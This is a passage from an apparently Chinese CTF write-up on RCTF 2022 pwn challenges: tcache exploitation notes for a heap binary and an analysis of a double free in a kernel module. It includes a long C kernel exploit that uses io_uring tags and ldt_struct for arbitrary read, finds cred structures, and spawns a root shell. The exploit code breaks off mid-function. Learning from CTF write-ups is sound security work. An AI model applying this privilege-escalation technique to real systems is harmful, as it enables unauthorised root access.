c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( init_2 )<br>&#123;<br>  --init_2;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1LL</span>);<br>&#125;<br><span class="hljs-keyword">return</span> init_2;<br></code></pre></div></td></tr></table></figure><p>完蛋, 又要wp学习法了吗…….</p><h3 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h3><blockquote><p>行吧, 预期解是house of apple. 难怪用2.35, 有用到IO chain. </p><p>但是nu1l的是tcache相关. 另一个<a href="https://github.com/nobodyisnobody/write-ups/tree/main/RCTF.2022/pwn/bfc">非预期</a>.  </p></blockquote><p>1.读堆地址<br>2.修改tcache_struct，分配出tcache_struct<br>3.修改tcache_struct，随意分配，使tcache_struct被free并进⼊unsorted bin<br>4.泄漏libc地址，修改tcache_struct，分配⾄environ，此时栈地址应该被放⼊了堆中，泄漏栈地址<br>5.修改tcache_struct，分配到栈上，写ropd</p><p>但是实操第一步leak就卡住了. 诶算了, 借鉴个开头. 适用于几乎所有. </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>ss = <span class="hljs-keyword">lambda</span> data :p.send(data)<br>sa = <span class="hljs-keyword">lambda</span> delim,data :p.sendafter(delim, data)<br>sl = <span class="hljs-keyword">lambda</span> data :p.sendline(data)<br>sla = <span class="hljs-keyword">lambda</span> delim,data :p.sendlineafter(delim, data)<br>ra = <span class="hljs-keyword">lambda</span> :p.recv()<br>rc = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span> :p.recv(numb)<br>ru = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span> :p.recvuntil(delims, drop)<br>uu32 = <span class="hljs-keyword">lambda</span> data :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> data :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>itt = <span class="hljs-keyword">lambda</span> :p.interactive()<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><span class="hljs-comment">#offset from zero</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):</span><br>    glibc_dir = <span class="hljs-string">&#x27;/glibs/glibc-2.35/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %self/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print\x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript+<span class="hljs-string">&#x27;init-pwndbg\nni\n&#x27;</span>)<br>    time.sleep(<span class="hljs-number">1</span>)<br>binary = <span class="hljs-string">&#x27;./bfc&#x27;</span><br>elf = ELF(binary)<br>p = process(binary, aslr=<span class="hljs-literal">False</span>)<br>context(binary = elf ,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>debug()<br></code></pre></div></td></tr></table></figure><h2 id="GAME"><a href="#GAME" class="headerlink" title="GAME"></a>GAME</h2><blockquote><p>本来是文件系统的题目, 结果有一个很简单的非预期<a href="https://github.com/maple3142/My-CTF-Challenges/tree/master/ImaginaryCTF/Round%2026/not_a_kernel_pwn">类似题目</a>. 就是init里面unmount放在了shell退出之后, 于是利用shell来覆盖unmount文件达到pop root shell的目的. 然后看看他的<a href="https://blog.rois.io/2022/rctf-2022-official-write-up/">预期解</a>. 是作者自己找的CVE, 嗯…………wp写的挺混沌, 文字 示例代码 exp三者对不上号. 看了好几天. </p></blockquote><ul><li>看到内核模块的参数设置, 还有<code>file-&gt;private_data</code>这个随意使用的指针. </li><li>看到我有一本Linux Device Driver, 感觉可以看看(学不完了这是)</li><li><a href="https://www.kernel.org/doc/htmldocs/kernel-api/API-kmemdup.html"><code>kmemdup_nul</code></a>: duplicate region of memory with <u>null-terminated</u>. 和使用max做参数的<code>kstrndump</code>相比使用给定的长度, 性能更好. </li><li>gef抽风, 直接pull使用gef-remote失败, 使用示例image成功, 自己的又失败, 直接删掉重新git clone成功. 不知道啥问题, 反正解决了, 快照真好用. <ul><li><code>gef-remote --qemu-user --qemu-binary vmlinux localhost 1234</code> 新版gef remote</li></ul></li><li><a href="https://man7.org/linux/man-pages/man2/modify_ldt.2.html">modify_ldr</a>: <code>syscall(SYS_modify_ldt, int func, void *ptr, long bytecount);</code> func=1的时候是修改<code>ptr-&gt;entry_number</code>而不是读取(0). </li><li>无意间发现代佬的<a href="https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/">常用结构体集合</a>博客, 发现此题预期解前几步就在里面, 果然还是套路见少了. </li><li>io_uring 相关. <a href="https://kernel.dk/io_uring.pdf">最全的英文文档</a>, 已下载. 看什么博客都不全, 连个<code>io_uring_queue_init</code>都找不到. 让我花点时间看看<ul><li>tag<ul><li>Each tag contains a maximum of PAGE_SIZE bytes. 至于什么是tag和table还得再看看. </li><li>我居然搜不到<code>io_uring_register_buffers_tags</code>的文档, <strong>而且为啥tag是啥都不说的</strong>, 难道是原本io的东西? 诶到时再看吧. 搜东西真累. man page都没有. </li><li>tag是二维数组. 第一维是8字节~0x1000(一个page)的子数组, 第二维是真正的tag数值, 通过<code>copy_from_user</code>从用户得到.</li><li>所以0x10的大小可以塞下一个子数组里两个tag值.  </li></ul></li><li>安装&amp;困难<ul><li>liburing将基本的系统调用包装了一下, 省去了手动建立io_uring instance的过程, 提供了一套更简单的接口. 即<code>queue_init</code>之类. </li><li>不懂IO操作会看的有一些困难. iovec就愣了一会儿. 找个时间看看原始的IO操作. </li><li><code>apt install liburing-dev</code> 然后再gcc的时候加上链接选项<code>-luring</code>即可. </li></ul></li><li>func<ul><li><code>io_uring_setup</code> 如名称一样只是setup一个io_uring结构体, 返回的fd还要手动mmap到进程空间中才能被内核与用户共享. submission和completion放在一个固定的offset上(通过macro). </li><li><code>io_uring_queue_init</code> with at least entries entries in the submission queue and then maps the file descriptor to memory shared between the application and the kernel.</li><li><code>io_uring_register_buffers</code> One of those is the ability to map a program’s I/O buffers into the kernel. 至于由tag的版本见上面. </li></ul></li></ul></li><li>看了几天居然有遗漏的地方, 难怪第一阶段就看不明白, reborn部分概括已修改. 好吧原来第一阶段的东西对后面有作用, 而且heap地址泄露完全和double free没有关系…..change()之后直接read就能读取heap地址….<del>这是在搞啥啊</del>. 终于看懂, </li><li>**结论: 发现一条路径能够通过修改指针指向的位置, 那就去想能否改变指针从而达到任意写? 多注意malloc和free函数, delMaind分析就写几个字怎么能反应得到呢. ** </li><li>发现之前找FUSE的时候看到的一篇文章里开头就是uring. <a href="https://web.archive.org/web/20221119160242/https://www.graplsecurity.com/post/iou-ring-exploiting-the-linux-kernel">链接在此</a>. 原网站挂了用的webarchive. 挺长的. 甚至还有一篇使用ebpf进行kernel pwn的<a href="https://web.archive.org/web/20221119160242/https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story">文章</a>, 不知道啥时候有心情看. 都在kernel in all中. </li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Maind</span></span><br><span class="hljs-class"><span class="hljs-title">unsigned</span> <span class="hljs-title">long</span> <span class="hljs-title">id</span>;</span><br><span class="hljs-keyword">char</span> username[<span class="hljs-number">0x20</span>];<br><span class="hljs-keyword">void</span> *cur;<br><span class="hljs-keyword">void</span> *prv;<br><span class="hljs-keyword">int</span> random;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mycdev</span> &#123;</span><br>    <span class="hljs-keyword">int</span> len;<br>    <span class="hljs-keyword">unsigned</span>   <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">50</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span>   <span class="hljs-title">cdev</span> <span class="hljs-title">cdev</span>;</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>module操作</p><ul><li>open: kzmalloc一个Maind结构体放到<code>file-&gt;private_data</code>里面</li><li>read: 最多9字节, 从<code>context-&gt;cur</code>复制</li><li>release: <code>private_data</code>直接置空</li><li>unlocked_ioctl: 0 1 114 22. 这特么是重生模拟器么.<ul><li>born: arg为username, 生成运气为ordinary, id=0. </li><li>reborn: cur移到prv, 生成unlucky和-114514的money. 很臭的金钱数. context-&gt;id++<br><strong>注意cur-&gt;magic移动到prv后并没有清空, 导致double free</strong> </li><li>change: arg为逗号分隔的等式, 左边为key_list, 右边可能为magic的字符串, 或money的钱数. <ul><li>当key=flag时, 直接对cur-&gt;magic进行free. </li></ul></li><li>delMaind: 就是删除. cur和prv都free, 在这里发生double free. </li></ul></li></ul><p>就是double free的利用. 其实挺简单的. 主要学到的东西是io_uring加上ldt_struct的利用</p><ul><li>io_uring中的tag操作可以malloc一个二维数组<code>size_t **tag</code>, 还有一个update_tag函数可以修改内容. 第一二级数组都是分配在内核heap上, 还可以通过二级数组来控制一级数组分配的大小. 如果能控制一级数组的指针, 那就相当于一个任意写. 方法是…详见代码. </li><li>此时ldt的modify操作中分配了一个0x10字节ldt_struct结构体, 前8字节在<code>read_ldt()</code>系统调用中在内核态使用memcpy来读取<strong>任意长度</strong>的<code>ldt_struct-&gt;entries</code>到用户区. 配合UAF漏洞可以和tag二级数组重合, 从而改变entries指针达到任意读. </li><li>最后找到cred结构体是通过第一步的heap指针往高处找(不知道为什么要跳到中间然后再前后找的方式). 发现设置好的进程名称后即可发现子进程的cred. 然后修改偏移查看哪个子进程提权了即可. 用到了SIGSTOP &amp;&amp; SIGCONT. 属于是process spray(误). </li></ul><h3 id="wp-1"><a href="#wp-1" class="headerlink" title="wp"></a>wp</h3><p>使用io_uring去修改ldt_struct结构体, </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;asm/ldt.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;liburing.h&quot;</span></span><br><br><span class="hljs-keyword">int</span> fd = <span class="hljs-number">-1</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PAGESIZE 0x1000</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ProcessNUM  0x30</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> UringNUM 0x20</span><br><span class="hljs-keyword">pid_t</span> processes[ProcessNUM];<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __ID__ <span class="hljs-meta-string">&quot;wawwwwww&quot;</span></span><br><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring</span> <span class="hljs-title">ring</span>, <span class="hljs-title">ring1</span>, <span class="hljs-title">ring2</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ldt_struct</span> &#123;</span><br>    <span class="hljs-keyword">size_t</span>   entries;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> nr_entries;<br>    <span class="hljs-keyword">int</span>         slot;<br>&#125;;<br><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">errExit</span><span class="hljs-params">(<span class="hljs-keyword">char</span> * msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Error at: %s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init_uring</span><span class="hljs-params">()</span></span>&#123;<br>    io_uring_queue_init(<span class="hljs-number">2</span>,&amp;ring, <span class="hljs-number">0</span>);<br>    io_uring_queue_init(<span class="hljs-number">2</span>,&amp;ring1,<span class="hljs-number">0</span>);<br>    io_uring_queue_init(<span class="hljs-number">2</span>,&amp;ring2,<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">register_tag</span><span class="hljs-params">(struct io_uring *ring,<span class="hljs-keyword">size_t</span> *data,<span class="hljs-keyword">int</span> num)</span></span>&#123;<br>    <span class="hljs-keyword">char</span> tmp_buf[<span class="hljs-number">0x2000</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">vecs</span>[<span class="hljs-title">num</span>];</span><br>    <span class="hljs-keyword">size_t</span> tags[num];<br>    <span class="hljs-built_in">memcpy</span>(tags,data,num*<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">size_t</span>));<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;num;i++)&#123;<br>        vecs[i].iov_base = tmp_buf;<br>        vecs[i].iov_len = <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-comment">//io_alloc_page_table</span><br>    <span class="hljs-keyword">int</span> res = io_uring_register_buffers_tags(ring,vecs,tags,num);<span class="hljs-comment">//kcalloc(nr_tables, sizeof(*table), GFP_KERNEL_ACCOUNT);</span><br>    <span class="hljs-keyword">if</span> (res &lt; <span class="hljs-number">0</span>)&#123;<br>        errExit(<span class="hljs-built_in">sprintf</span>(<span class="hljs-string">&quot;io_uring_register_buffers_tags %d\n&quot;</span>,res));<br>    &#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">update_tag</span><span class="hljs-params">(struct io_uring *ring,<span class="hljs-keyword">size_t</span> Data,<span class="hljs-keyword">int</span> num)</span></span>&#123;<br>    <span class="hljs-keyword">char</span> tmp_buf[<span class="hljs-number">1024</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">vecs</span>[2];</span><br>    vecs[<span class="hljs-number">0</span>].iov_base = tmp_buf;<br>    vecs[<span class="hljs-number">0</span>].iov_len = <span class="hljs-number">1</span>;<br>    vecs[<span class="hljs-number">1</span>].iov_base = tmp_buf;<br>    vecs[<span class="hljs-number">1</span>].iov_len = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">int</span> ret = io_uring_register_buffers_update_tag(ring, <span class="hljs-number">0</span>,vecs,Data,num);<br>    <span class="hljs-keyword">if</span> (ret &lt;<span class="hljs-number">0</span>)&#123;<br>        errExit(<span class="hljs-built_in">sprintf</span>(<span class="hljs-string">&quot;io_uring_register_buffers_update_tag %d\n&quot;</span>,ret));<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">spawn_processes</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; ProcessNUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">pid_t</span> child = fork();<br>        <span class="hljs-keyword">if</span> (child == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">if</span> (prctl(PR_SET_NAME, __ID__, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) != <span class="hljs-number">0</span>) &#123;<br>                perror(<span class="hljs-string">&quot;Could not set name&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">uid_t</span> old = getuid();<br>            kill(getpid(), SIGSTOP);<br>            <span class="hljs-keyword">uid_t</span> uid = getuid();<br>            <span class="hljs-keyword">if</span> (uid == <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Enjoy root!&quot;</span>);<br>                system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>            &#125;<br>            <span class="hljs-built_in">exit</span>(uid);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (child &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> child;<br>        &#125;<br>        processes[i] = child;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">size_t</span> <span class="hljs-title">find_cred</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> heap)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ldt_struct</span> <span class="hljs-title">ldt</span>;</span><br>    <span class="hljs-keyword">char</span> buf[PAGESIZE];<br>    <span class="hljs-keyword">size_t</span> *result_addr;<br>    <span class="hljs-keyword">size_t</span> cred_addr = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">int</span> pipe_fd[<span class="hljs-number">2</span>];<br>    <span class="hljs-keyword">int</span> res = pipe(pipe_fd);<br>    <span class="hljs-keyword">if</span>(res)<br>        errExit(<span class="hljs-string">&quot;pipe&quot;</span>);<br><br>    heap = (heap/<span class="hljs-number">0x1000</span>)*<span class="hljs-number">0x1000</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; PAGESIZE*PAGESIZE ; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(i &amp;&amp; (i % <span class="hljs-number">0x100</span>) == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;looked up range from %p ~ %p\n&quot;</span>,heap - i * PAGESIZE,heap + i * PAGESIZE);<br>        &#125;<br>        <span class="hljs-comment">//Forward search</span><br>        <span class="hljs-built_in">memset</span>(buf,<span class="hljs-number">0</span>,PAGESIZE);<br>        ldt.entries = heap - i * PAGESIZE;<br>        ldt.nr_entries = PAGESIZE/<span class="hljs-number">8</span>;<br>        update_tag(&amp;ring,&amp;ldt,<span class="hljs-number">2</span>);<span class="hljs-comment">//Setting the search Address</span><br>        <span class="hljs-keyword">if</span>(!fork())&#123;<br>            <span class="hljs-keyword">int</span> res = syscall(SYS_modify_ldt, <span class="hljs-number">0</span>, buf, PAGESIZE);<br>            <span class="hljs-keyword">if</span>(res == PAGESIZE)&#123;<br>                result_addr = (<span class="hljs-keyword">size_t</span>*) memmem(buf, <span class="hljs-number">0x1000</span>, __ID__, <span class="hljs-number">8</span>);<br>                <span class="hljs-keyword">if</span> (result_addr)&#123;<br>                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found cred: \033[0m0x%lx\n&quot;</span>, result_addr[<span class="hljs-number">-2</span>]);<br>                    cred_addr = result_addr[<span class="hljs-number">-2</span>];<br>                &#125;<br>                write(pipe_fd[<span class="hljs-number">1</span>], &amp;cred_addr, <span class="hljs-number">8</span>);<br>            &#125;<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>        wait(<span class="hljs-literal">NULL</span>);<br>        read(pipe_fd[<span class="hljs-number">0</span>], &amp;cred_addr, <span class="hljs-number">8</span>);<br>        <span class="hljs-keyword">if</span> (cred_addr != <span class="hljs-number">-1</span>)<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//Search backwards</span><br>        <span class="hljs-built_in">memset</span>(buf,<span class="hljs-number">0</span>,PAGESIZE);<br>        ldt.entries = heap + i * PAGESIZE;<br>        ldt.nr_entries = PAGESIZE/<span class="hljs-number">8</span>;<br>        update_tag(&amp;ring,&amp;ldt,<span class="hljs-number">2</span>);<span class="hljs-comment">//Setting the search Address</span><br>        <span class="hljs-keyword">if</span>(!fork())&#123;<br>            <span class="hljs-keyword">int</span> res = syscall(SYS_modify_ldt, <span class="hljs-number">0</span>, buf, PAGESIZE);<br>            <span class="hljs-keyword">if</span>(res == PAGESIZE)&#123;<br>                result_addr = (<span class="hljs-keyword">size_t</span>*) memmem(buf, <span class="hljs-number">0x1000</span>, __ID__, <span class="hljs-number">8</span>);<br>                <span class="hljs-keyword">if</span> (result_addr)&#123;<br>                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found cred: \033[0m0x%lx\n&quot;</span>, result_addr[<span class="hljs-number">-2</span>]);<br>                    cred_addr = result_addr[<span class="hljs-number">-2</span>];<br>                &#125;<br>                write(pipe_fd[<span class="hljs-number">1</span>], &amp;cred_addr, <span class="hljs-number">8</span>);<br>            &#125;<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>        wait(<span class="hljs-literal">NULL</span>);<br>        read(pipe_fd[<span class="hljs-number">0</span>], &amp;cred_addr, <span class="hljs-number">8</span>);<br>        <span class="hljs-keyword">if</span> (cred_addr != <span class="hljs-number">-1</span>)<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> cred_addr;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">spawn_root_shell</span><span 